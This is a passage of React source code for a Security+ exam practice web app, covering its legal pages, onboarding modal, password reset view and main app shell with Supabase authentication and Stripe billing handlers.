          <div key={ch.id} className="card chapter-card" style={{padding:"18px 20px"}}>
            <div style={{display:"flex",justifyContent:"space-between",gap:10,alignItems:"flex-start",marginBottom:8}}>
              <div style={{fontWeight:700,color:t.text,fontSize:14,display:"flex",alignItems:"center",gap:10}}><ChapterIcon id={ch.id}/> {ch.title}</div>
              <span className="chip" style={{background:`${t.accent}12`,color:t.accent,borderColor:`${t.accent}30`}}>{ch.weight}%</span>
            </div>
            <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
              {ch.topics.map(topic=>(
                <span key={topic} className="chip" style={{fontSize:11,color:t.textSec,borderColor:t.border,background:t.panel}}>{topic}</span>
              ))}
            </div>
          </div>
        ))}
      </div>

      <div className="card" style={{padding:"20px 22px",marginBottom:16}}>
        <div style={{fontWeight:700,color:t.text,marginBottom:8}}>How SecurePlus maps to the exam</div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(180px,1fr))",gap:10}}>
          {[
            {label:"MCQ Bank",value:`${MCQ_BANK.length} questions`},
            {label:"PBQ Bank",value:`${PBQ_BANK.length} simulations`},
            {label:"Domains",value:"5 objective areas"},
            {label:"Question Types",value:"MCQ, terminal, ordering, hotspot, drag/drop, logs"},
          ].map(item=>(
            <div key={item.label} style={{padding:"12px 14px",border:`1px solid ${t.border}`,borderRadius:8,background:t.panel}}>
              <div className="label">{item.label}</div>
              <div style={{fontWeight:800,color:t.text,fontSize:18}}>{item.value}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="card" style={{padding:"20px 22px",borderColor:`${t.accent}40`}}>
        <div style={{fontWeight:700,color:t.text,marginBottom:8}}>Contact support</div>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
          For account, billing, content, or technical questions, email{" "}
          <a href="mailto:secureplus.support@gmail.com" style={{color:t.accent,fontWeight:700}}>secureplus.support@gmail.com</a>.
        </p>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// PRIVACY + TERMS
// ═══════════════════════════════════════════════════════════════
function LegalPage({type,t}) {
  const isPrivacy = type === "privacy";
  const sections = isPrivacy ? [
    {
      title:"Information we collect",
      body:"We collect account details such as your email address, authentication provider, subscription status, and practice activity so SecurePlus can save your progress and unlock the correct features.",
    },
    {
      title:"How we use information",
      body:"We use your information to provide the practice platform, authenticate your account, process subscriptions through Stripe, send account emails through Supabase or our email provider, improve the product, and respond to support requests.",
    },
    {
      title:"Payments",
      body:"Payments are handled by Stripe. SecurePlus does not store your card number. Stripe may process payment details, billing information, and subscription events according to Stripe's own privacy and security practices.",
    },
    {
      title:"Data sharing",
      body:"We share data only with service providers needed to run the site, such as Supabase, Stripe, Vercel, email delivery providers, and analytics or security tools we choose to enable. We do not sell personal information.",
    },
    {
      title:"Your choices",
      body:"You can request help, billing support, or account deletion by contacting secureplus.support@gmail.com. If you delete your account, saved profile and practice data may be removed according to our database retention settings.",
    },
  ] : [
    {
      title:"Use of SecurePlus",
      body:"SecurePlus provides CompTIA Security+ practice content for study and preparation. You agree to use the site lawfully and not abuse, scrape, resell, reverse engineer, or interfere with the platform.",
    },
    {
      title:"Accounts",
      body:"You are responsible for keeping your login information secure. You should use a real email address so you can verify your account, reset your password, and receive account notices.",
    },
    {
      title:"Subscriptions",
      body:"Paid access is billed through Stripe. Subscription features are unlocked only when Stripe and Supabase show an active or trialing subscription. You can cancel through the billing portal when available or by contacting support.",
    },
    {
      title:"Educational content",
      body:"SecurePlus is an independent study tool and is not affiliated with or endorsed by CompTIA. Exam names and trademarks belong to their respective owners. Practice questions are for learning and are not real exam questions.",
    },
    {
      title:"Limitations",
      body:"We work to keep the site accurate and available, but we do not guarantee exam results, uninterrupted service, or error-free content. Use SecurePlus as one part of your broader study plan.",
    },
  ];

  return(
    <div style={{padding:"28px 24px",maxWidth:780,margin:"0 auto"}}>
      <div className="page-title-row">
        <NavGlyph type={isPrivacy ? "privacy" : "terms"} active/>
        <h2 style={{fontSize:24,fontWeight:800,color:t.text}}>
          {isPrivacy ? "Privacy Policy" : "Terms & Conditions"}
        </h2>
      </div>
      <p style={{color:t.textSec,fontSize:14,marginBottom:20}}>
        Last updated: May 9, 2026. Questions? Contact{" "}
        <a href="mailto:secureplus.support@gmail.com" style={{color:t.accent,fontWeight:700}}>secureplus.support@gmail.com</a>.
      </p>

      <div style={{display:"flex",flexDirection:"column",gap:12}}>
        {sections.map(section=>(
          <section key={section.title} className="card" style={{padding:"18px 20px"}}>
            <h3 style={{fontSize:15,fontWeight:700,color:t.text,marginBottom:6}}>{section.title}</h3>
            <p style={{fontSize:13,color:t.textSec,lineHeight:1.75}}>{section.body}</p>
          </section>
        ))}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// ONBOARDING
// ═══════════════════════════════════════════════════════════════
function OnboardingModal({user,t,onClose,onPricing}) {
  const [step,setStep]=useState(0);
  const slides=[
    {
      icon:"👋",
      title:`Welcome${user?.name ? `, ${user.name.split(" ")[0]}` : ""}`,
      body:"SecurePlus is built to turn Security+ practice into a repeatable workflow: answer questions, review explanations, and come back to weak areas.",
      bullets:["Your dashboard tracks readiness and accuracy.","Your attempts are saved so practice can get smarter.","Start with MCQs, then add PBQs when you want exam-style simulation."],
    },
    {
      icon:"📝",
      title:"Where to practise",
      body:"Use the bottom or side navigation to move around the app.",
      bullets:["MCQ Practice gives access to all multiple-choice questions.","Daily Challenge gives a short focused drill.","PBQ Simulator contains performance-based simulations for Pro users."],
    },
    {
      icon:"📋",
      title:"What Security+ covers",
      body:"CompTIA Security+ tests broad security knowledge across concepts, threats, architecture, operations, and governance.",
      bullets:["Expect both MCQs and performance-based questions.","PBQs may ask you to interpret logs, configure controls, order steps, or solve scenario tasks.","SecurePlus helps solidify skills through practice, feedback, and review."],
    },
    {
      icon:"⬆️",
      title:"When Pro helps",
      body:"The free plan is useful for MCQ practice. Pro is for students who want PBQ simulation practice too.",
      bullets:["Unlock all PBQ simulations.","Practise terminal, log analysis, ordering, hotspot, and drag/drop-style tasks.","Costs $4.99/year, roughly $0.40/month."],
    },
  ];
  const slide=slides[step];
  const last=step===slides.length-1;

  return(
    <div className="onboarding-overlay" role="dialog" aria-modal="true" aria-label="SecurePlus onboarding">
      <div className="onboarding-modal card">
        <button className="btn btn-ghost" style={{position:"absolute",top:14,right:14,minHeight:32,padding:"4px 10px",fontSize:12}} onClick={onClose}>
          Skip
        </button>
        <div style={{fontSize:42,marginBottom:14}}>{slide.icon}</div>
        <h2 style={{fontSize:24,fontWeight:900,color:t.text,marginBottom:8}}>{slide.title}</h2>
        <p style={{fontSize:14,color:t.textSec,lineHeight:1.7,marginBottom:18}}>{slide.body}</p>
        <div style={{display:"flex",flexDirection:"column",gap:10,marginBottom:22}}>
          {slide.bullets.map(item=>(
            <div key={item} style={{display:"flex",gap:10,alignItems:"flex-start",fontSize:13,color:t.textSec,lineHeight:1.6}}>
              <span style={{color:t.green,fontWeight:900}}>✓</span>
              <span>{item}</span>
            </div>
          ))}
        </div>
        <div style={{display:"flex",gap:7,marginBottom:20}}>
          {slides.map((_,i)=>(
            <div key={i} style={{height:7,flex:1,borderRadius:99,background:i<=step?t.accent:t.border}}/>
          ))}
        </div>
        <div style={{display:"flex",gap:10,justifyContent:"space-between",flexWrap:"wrap"}}>
          <button className="btn btn-ghost" onClick={()=>setStep(s=>Math.max(0,s-1))} disabled={step===0}>
            Back
          </button>
          <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
            {last&&(
              <button className="btn btn-outline" onClick={()=>{onClose();onPricing();}}>
                View Pro
              </button>
            )}
            <button className="btn btn-primary" onClick={()=>last?onClose():setStep(s=>s+1)}>
              {last ? "Start Practising" : "Next"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function PasswordUpdateView({t,onDone}) {
  const [form,setForm]=useState({pass:"",confirm:""});
  const [err,setErr]=useState("");
  const [ok,setOk]=useState("");
  const [loading,setLoading]=useState(false);
  const set=k=>e=>setForm(f=>({...f,[k]:e.target.value}));
  const submit=async()=>{
    setErr("");setOk("");
    if(form.pass!==form.confirm){setErr("Passwords do not match.");return;}
    const passwordIssue=getPasswordIssue(form.pass);
    if(passwordIssue){setErr(passwordIssue);return;}
    setLoading(true);
    try{
      const { error } = await supabase.auth.updateUser({ password: form.pass });
      if(error) throw error;
      setOk("Password updated. You can continue to SecurePlus.");
      setTimeout(onDone,700);
    }catch(e){
      setErr(e.message||"Unable to update password.");
    }finally{
      setLoading(false);
    }
  };

  return(
    <div style={{minHeight:"100vh",display:"grid",placeItems:"center",padding:24}}>
      <div className="card" style={{width:"100%",maxWidth:430,padding:"28px 28px"}}>
        <div style={{display:"inline-flex",alignItems:"center",gap:10,padding:"7px 11px",border:`1px solid ${t.border}`,borderRadius:8,background:t.panel,marginBottom:20}}>
          <BrandMark size={28}/>
          <span style={{fontWeight:800,color:t.text}}>SecurePlus</span>
        </div>
        <h1 style={{fontSize:26,color:t.text,marginBottom:8}}>Set a new password</h1>
        <p style={{fontSize:13,color:t.textSec,lineHeight:1.6,marginBottom:18}}>
          Use 8+ characters with uppercase, lowercase, a number, and a special character.
        </p>
        <Alert msg={err} type="error" t={t}/>
        <Alert msg={ok} type="success" t={t}/>
        <div style={{display:"flex",flexDirection:"column",gap:14}}>
          <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>New Password</label>
            <input className="input" type="password" placeholder="At least 8 characters" value={form.pass} onChange={set("pass")} onKeyDown={e=>e.key==="Enter"&&submit()}/></div>
          <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>Confirm Password</label>
            <input className="input" type="password" placeholder="••••••••" value={form.confirm} onChange={set("confirm")} onKeyDown={e=>e.key==="Enter"&&submit()}/></div>
          <button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"11px"}} onClick={submit} disabled={loading}>
            {loading?"Updating...":"Update Password"}
          </button>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// APP ROOT
// ═══════════════════════════════════════════════════════════════
export default function App() {
  const [darkMode,setDarkMode]=useState(true);
  const [user,setUser]=useState(null);
  const [loading,setLoading]=useState(true);
  const [view,setView]=useState("dashboard");
  const [attempts,setAttempts]=useState([]);
  const [pbqQ,setPbqQ]=useState(null);
  const [showDaily,setShowDaily]=useState(false);
  const [billingLoading,setBillingLoading]=useState(false);
  const [passwordRecovery,setPasswordRecovery]=useState(false);
  const [showOnboarding,setShowOnboarding]=useState(false);

  const t=darkMode?THEMES.dark:THEMES.light;

  useEffect(()=>{
    if(user) identifyUser(user);
  },[user]);

  useEffect(()=>{
    const referralCode = rememberReferralFromUrl();
    if (referralCode) capture("referral_link_opened", { referral_code: referralCode });
  },[]);

  useEffect(()=>{
    capture("app_viewed", { view, signed_in: Boolean(user), tier: user?.tier || "guest" });
  },[view,user?.tier]);

  useEffect(()=>{
    let active=true;

    if(isSupabaseConfigured){
      const applySupabaseSession=async session=>{
        if(!active)return;
        if(!session?.user){
          setUser(null);
          setAttempts([]);
          setLoading(false);
          return;
        }
        const appUser=await getSupabaseProfile(session.user);
        let displayUser=appUser;
        const params = new URLSearchParams(window.location.search);
        if(params.get("checkout")==="success" || params.get("billing")==="return"){
          const syncedUser = await syncStripeProfile(session.user, params.get("session_id") || "");
          if(syncedUser) {
            displayUser = syncedUser;
            const cleanUrl = `${window.location.origin}${window.location.pathname}`;
            window.history.replaceState({}, "", cleanUrl);
          }
        }
        const savedAttempts=await loadSupabaseAttempts(session.user.id);
        if(!active)return;
        const referralClaim = await claimReferralIfPresent(displayUser);
        if(referralClaim?.proTrialUntil) displayUser = { ...displayUser, tier: "pro", proTrialUntil: referralClaim.proTrialUntil };
        setUser(displayUser);
        identifyUser(displayUser);
        setAttempts(savedAttempts);
        const seen=await DB.getOnboardingSeen(appUser.email);
        if(active&&!seen) setShowOnboarding(true);
        setLoading(false);
      };

      supabase.auth.getSession().then(({ data })=>applySupabaseSession(data.session));
      const { data: listener } = supabase.auth.onAuthStateChange((event, session)=>{
        if(event==="PASSWORD_RECOVERY") setPasswordRecovery(true);
        applySupabaseSession(session);
      });
      return()=>{
        active=false;
        listener?.subscription?.unsubscribe();
      };
    }

    (async()=>{
      const sess=await DB.getSession();
      if(sess?.loggedIn){const u=await DB.getUser(sess.email);if(u){setUser(u);const a=await DB.getAttempts(u.email);setAttempts(a);const seen=await DB.getOnboardingSeen(u.email);if(!seen)setShowOnboarding(true);}}
      setLoading(false);
    })();
    return()=>{active=false;};
  },[]);

  const handleLogin=useCallback(async u=>{
    const referralClaim=await claimReferralIfPresent(u);
    const displayUser=referralClaim?.proTrialUntil ? { ...u, tier: "pro", proTrialUntil: referralClaim.proTrialUntil } : u;
    setUser(displayUser);
    identifyUser(displayUser);
    const a=u?.authProvider==="supabase" ? await loadSupabaseAttempts(u.id) : await DB.getAttempts(u.email);
    const seen=await DB.getOnboardingSeen(displayUser.email);
    if(!seen) setShowOnboarding(true);
    setAttempts(a);setView("dashboard");setShowDaily(false);
  },[]);
  const handleLogout=useCallback(async()=>{
    if(isSupabaseConfigured) await supabase.auth.signOut();
    resetAnalytics();
    await DB.clearSession();setPasswordRecovery(false);setShowOnboarding(false);setUser(null);setAttempts([]);setView("dashboard");
  },[]);
  const handleUpdateProfile=useCallback(async name=>{
    if(!user)return;
    const clean=name.trim();
    if(user.authProvider==="supabase"){
      const { data, error } = await supabase.auth.updateUser({ data: { full_name: clean, name: clean } });
      if(error) throw error;
      const updated={...user,name:clean,loginMethod:data?.user?.app_metadata?.provider || user.loginMethod || "email"};
      setUser(updated);identifyUser(updated);
      return;
    }
    const updated={...user,name:clean,authProvider:user.authProvider||"local",loginMethod:user.loginMethod||"local"};
    await DB.saveUser(updated);
    await DB.saveSession({email:updated.email,name:updated.name,tier:updated.tier,loggedIn:true});
    setUser(updated);identifyUser(updated);
  },[user]);
  const handleChangePassword=useCallback(async password=>{
    if(!user)return;
    if((user.loginMethod||"").toLowerCase().includes("google")){
      throw new Error("This account uses Google SSO. Change your password in your Google account.");
    }
    if(user.authProvider==="supabase"){
      const { error } = await supabase.auth.updateUser({ password });
      if(error) throw error;
      return;
    }
    const updated={...user,password,authProvider:user.authProvider||"local",loginMethod:user.loginMethod||"local"};
    await DB.saveUser(updated);
    setUser(updated);
  },[user]);
  const closeOnboarding=useCallback(async()=>{
    if(user?.email) await DB.saveOnboardingSeen(user.email);
    setShowOnboarding(false);
  },[user]);
  const handleCancelMembership=useCallback(async()=>{
    if(!isSupabaseConfigured){
      alert("Membership cancellation will use Stripe's billing portal once Supabase and Stripe env vars are configured. For now, contact secureplus.support@gmail.com.");
      return;
    }
    setBillingLoading(true);
    try{
      capture("checkout_started", { tier: user.tier, has_referral: Boolean(getStoredReferralCode()) });
      const token=await getSupabaseAccessToken();
      if(!token){
        alert("Please sign in with Supabase before managing billing.");
        return;
      }
      const response=await fetch("/api/stripe/portal",{
        method:"POST",
        headers:{authorization:`Bearer ${token}`},
      });
      const data=await response.json().catch(()=>({}));
      if(!response.ok||!data.url) throw new Error(data.error||"Unable to open billing portal.");
      window.location.href=data.url;
    }catch(error){
      alert(error.message||"Unable to open billing portal. Contact secureplus.support@gmail.com.");
    }finally{
      setBillingLoading(false);
    }
  },[]);
  const handleSyncBilling=useCallback(async()=>{
    if(!user)return;
    if(!isSupabaseConfigured || user.authProvider!=="supabase"){
      alert("Billing sync requires a live Supabase account.");
      return;
    }
    setBillingLoading(true);
    try{
      const { data } = await supabase.auth.getUser();
      const authUser = data?.user;
      if(!authUser){
        alert("Please sign in again before refreshing Pro status.");
        return;
      }
      const syncedUser = await syncStripeProfile(authUser);
      if(!syncedUser){
        alert("No active Stripe subscription was found for this account yet. If you just paid, wait 30 seconds and try again.");
        return;
      }
      setUser(syncedUser);
      identifyUser(syncedUser);
      alert(syncedUser.tier==="pro" ? "Pro status refreshed. Your account is Pro now." : "Stripe synced, but this account is not showing an active subscription.");
    }finally{
      setBillingLoading(false);
    }
  },[user]);
  const handleDeleteAccount=useCallback(async()=>{
    if(!user)return;
    const confirmed=window.confirm("Delete this SecurePlus account and saved progress? This cannot be undone.");
    if(!confirmed)return;

    if(!isSupabaseConfigured){
      await DB.deleteUser(user.email);
      await DB.clearSession();
      setUser(null);setAttempts([]);setView("dashboard");
      alert("Local demo account deleted from this browser.");
      return;
    }

    try{
      const token=await getSupabaseAccessToken();
      if(!token){
        alert("Please sign in with Supabase before deleting your account.");
        return;
      }
      const response=await fetch("/api/account/delete",{
        method:"POST",
        headers:{authorization:`Bearer ${token}`},
      });
      const data=await response.json().catch(()=>({}));
      if(!response.ok) throw new Error(data.error||"Unable to delete account.");
      await DB.clearSession();
      setUser(null);setAttempts([]);setView("dashboard");
      alert("Account deleted.");
    }catch(error){
      alert(error.message||"Unable to delete account. Contact secureplus.support@gmail.com.");
    }
  },[user]);
  const handleUpgrade=useCallback(async tier=>{
    if(!user)return;
    if(tier==="free"){
      const updated={...user,tier};await DB.saveUser(updated);setUser(updated);
      alert("Switched this local demo profile back to Free. In production, downgrades should go through Stripe billing portal or subscription cancellation.");
      return;
    }

    if(!isSupabaseConfigured){
      alert("Stripe Checkout is ready in the project code, but Supabase env vars are not configured yet. Add VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY, sign in with Supabase, then try again.");
      return;
    }

    setBillingLoading(true);
    try{
      const token=await getSupabaseAccessToken();
      if(!token){
        alert("Please sign in with Supabase before upgrading. Local demo accounts cannot start real Stripe Checkout.");
        return;
      }

      const response=await fetch("/api/stripe/checkout",{
        method:"POST",
        headers:{
          "content-type":"application/json",
          authorization:`Bearer ${token}`,
        },
        body: JSON.stringify({ referralCode: getStoredReferralCode() }),
      });
      const data=await response.json().catch(()=>({}));
      if(!response.ok||!data.url) throw new Error(data.error||"Unable to start Checkout.");
      window.location.href=data.url;
    }catch(error){
      alert(error.message||"Unable to start Stripe Checkout.");
    }finally{
      setBillingLoading(false);
    }
  },[user]);
  const handleSaveAttempt=useCallback(async r=>{
    if(!user)return;
    if(user.authProvider==="supabase") await saveSupabaseAttempt(user.id,r);
    else await DB.saveAttempt(user.email,r);
    setAttempts(a=>[r,...a]);
  },[user]);
  const handlePBQDone=useCallback(async (result,options={})=>{
    if(result&&user){
      if(user.authProvider==="supabase") await saveSupabaseAttempt(user.id,result);
      else await DB.saveAttempt(user.email,result);
      setAttempts(a=>[result,...a]);
    }
    if(options.nextQuestion){
      setPbqQ(options.nextQuestion);
      setView("pbq");
      return;
    }
    setPbqQ(null);setView("pbq");
  },[user]);

  const CSS=makeCSS(t);

  if(loading) return(
    <>
      <style>{CSS}</style>
      <div style={{minHeight:"100vh",display:"flex",alignItems:"center",justifyContent:"center",background:t.bg}}>
        <div style={{color:t.textDim,fontSize:15}}>Loading...</div>
      </div>
    </>
  );

  if(passwordRecovery) return(
    <>
      <style>{CSS}</style>
      <div style={{background:t.bg,minHeight:"100vh"}}>
        <PasswordUpdateView t={t} onDone={()=>{setPasswordRecovery(false);setView("dashboard");}}/>
      </div>
    </>
  );

  if(showDaily&&!user) return(
    <>
      <style>{CSS}</style>
      <div style={{background:t.bg,minHeight:"100vh"}}>
        <div style={{background:t.surface,borderBottom:`1px solid ${t.border}`,padding:"12px 24px",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
          <div style={{display:"flex",alignItems:"center",gap:8}}><BrandMark size={28}/><span style={{fontWeight:700,fontSize:15,color:t.text}}>SecurePlus</span></div>
          <div style={{display:"flex",gap:8}}>
            <button className="btn btn-ghost" style={{fontSize:12}} onClick={()=>setShowDaily(false)}>← Back</button>
            <button className="btn btn-outline" style={{fontSize:12}} onClick={()=>setShowDaily(false)}>Sign In / Register</button>
          </div>
        </div>
        <DailyChallenge t={t} onLogin={()=>setShowDaily(false)}/>
      </div>
    </>
  );

  if(!user&&(view==="privacy"||view==="terms")) return(
    <>
      <style>{CSS}</style>
      <div style={{background:t.bg,minHeight:"100vh"}}>
        <div style={{background:t.surface,borderBottom:`1px solid ${t.border}`,padding:"12px 24px",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
          <div style={{display:"flex",alignItems:"center",gap:8}}><BrandMark size={28}/><span style={{fontWeight:700,fontSize:15,color:t.text}}>SecurePlus</span></div>
          <button className="btn btn-outline" style={{fontSize:12}} onClick={()=>setView("dashboard")}>Sign In / Register</button>
        </div>
        <LegalPage type={view} t={t}/>
      </div>
    </>
  );

  if(!user) return(
    <>
      <style>{CSS}</style>
      <AuthView onLogin={handleLogin} t={t} onDaily={()=>setShowDaily(true)} onNavigate={setView}/>
    </>
  );

  if(pbqQ) return(
    <>
      <style>{CSS}</style>
      <div style={{background:t.bg,minHeight:"100vh"}}>
        <PBQSim
          q={pbqQ}
          nextQuestion={getNextRelatedPBQ(pbqQ,attempts)}
          onDone={handlePBQDone}
          onNext={(result)=>handlePBQDone(result,{nextQuestion:getNextRelatedPBQ(pbqQ,attempts)})}
          t={t}
        />
      </div>
    </>
  );

  const navItems=[
    {id:"dashboard",icon:"dashboard",label:"Dashboard"},
    {id:"mcq",icon:"mcq",label:"MCQ Practice"},
    {id:"pbq",icon:"pbq",label:"PBQ Simulator"},
    {id:"exam",icon:"exam",label:"Exam Mode"},
    {id:"daily",icon:"daily",label:"Daily Challenge"},
    {id:"pricing",icon:"pricing",label:"Upgrade"},
    {id:"objectives",icon:"objectives",label:"Objectives"},
    {id:"privacy",icon:"privacy",label:"Privacy Policy"},
    {id:"terms",icon:"terms",label:"Terms & Conditions"},
  ];

  return(
    <>
      <style>{CSS}</style>
      <div className="app-shell">
        {/* Sidebar */}
        <aside className="sidebar">
          {/* Logo */}
          <div style={{padding:"18px 16px",borderBottom:`1px solid ${t.border}`}}>
            <div style={{display:"flex",alignItems:"center",gap:9,fontWeight:700,fontSize:16,color:t.text}}><BrandMark size={30}/> SecurePlus</div>
            <div style={{fontSize:11,color:t.textDim,marginTop:2}}>CompTIA Security+ Practice Platform</div>
          </div>

          {/* User */}
          <div style={{padding:"12px 14px",borderBottom:`1px solid ${t.border}`}}>
            <ProfileMenu user={user} t={t} onUpdateProfile={handleUpdateProfile} onChangePassword={handleChangePassword} onLogout={handleLogout}/>
          </div>

          {/* Nav */}
          <nav style={{flex:1,padding:"10px 10px",display:"flex",flexDirection:"column",gap:2}}>
            {navItems.map(n=>(
              <div key={n.id} className={`nav-lnk ${view===n.id?"act":""}`} onClick={()=>setView(n.id==="exam"&&user.tier!=="pro"?"pricing":n.id)}>
                <NavGlyph type={n.icon} active={view===n.id}/>
                <span>{n.label}</span>
              </div>
            ))}
          </nav>

          {/* Dark mode + logout */}
          <div style={{padding:"12px 14px",borderTop:`1px solid ${t.border}`,display:"flex",flexDirection:"column",gap:6}}>
            <button className="btn btn-ghost" style={{fontSize:12,justifyContent:"flex-start"}} onClick={()=>setDarkMode(d=>!d)}>
              {darkMode?"☀️ Light Mode":"🌙 Dark Mode"}
            </button>
            <button className="btn btn-ghost" style={{fontSize:12,justifyContent:"flex-start",color:t.textDim}} onClick={handleLogout}>
              Sign Out
            </button>
          </div>
        </aside>

        {/* Main content */}
        <main className="app-main fu">
          <div className="mobile-topbar">
            <div>
              <div style={{display:"flex",alignItems:"center",gap:8,fontWeight:800,fontSize:15,color:t.text}}><BrandMark size={28}/> SecurePlus</div>
              <div style={{fontSize:11,color:t.textDim}}>CompTIA Security+ Practice</div>
            </div>
            <div style={{display:"flex",gap:6,alignItems:"center",flexShrink:0}}>
              <button className="btn btn-ghost" style={{fontSize:12,minHeight:34,padding:"6px 10px"}} onClick={()=>setDarkMode(d=>!d)}>
                {darkMode?"Light":"Dark"}
              </button>
              <ProfileMenu user={user} t={t} onUpdateProfile={handleUpdateProfile} onChangePassword={handleChangePassword} onLogout={handleLogout} compact/>
            </div>
          </div>
          {view==="dashboard"&&<Dashboard user={user} attempts={attempts} onNav={setView} t={t}/>}
          {view==="mcq"&&<MCQPractice user={user} attempts={attempts} onSave={handleSaveAttempt} onUpgrade={()=>setView("pricing")} t={t}/>}
          {view==="pbq"&&<PBQBank user={user} attempts={attempts} onStart={q=>user.tier==="free"?setView("pricing"):setPbqQ(q)} onUpgrade={()=>setView("pricing")} t={t}/>}
          {view==="exam"&&<ExamMode user={user} onSave={handleSaveAttempt} onUpgrade={()=>setView("pricing")} t={t}/>}
          {view==="daily"&&<DailyChallenge t={t} user={user} onLogin={()=>setView("dashboard")}/>}
          {view==="pricing"&&<Pricing user={user} onUpgrade={handleUpgrade} onSyncBilling={handleSyncBilling} onCancelMembership={handleCancelMembership} onDeleteAccount={handleDeleteAccount} onNavigate={setView} t={t} billingLoading={billingLoading}/>}
          {view==="referrals"&&<ReferralPage user={user} t={t}/>}
          {view==="objectives"&&<ObjectivesPage t={t}/>}
          {view==="privacy"&&<LegalPage type="privacy" t={t}/>}
          {view==="terms"&&<LegalPage type="terms" t={t}/>}
        </main>
        {showOnboarding&&(
          <OnboardingModal
            user={user}
            t={t}
            onClose={closeOnboarding}
            onPricing={()=>setView("pricing")}
          />
        )}
      </div>
    </>
  );
}
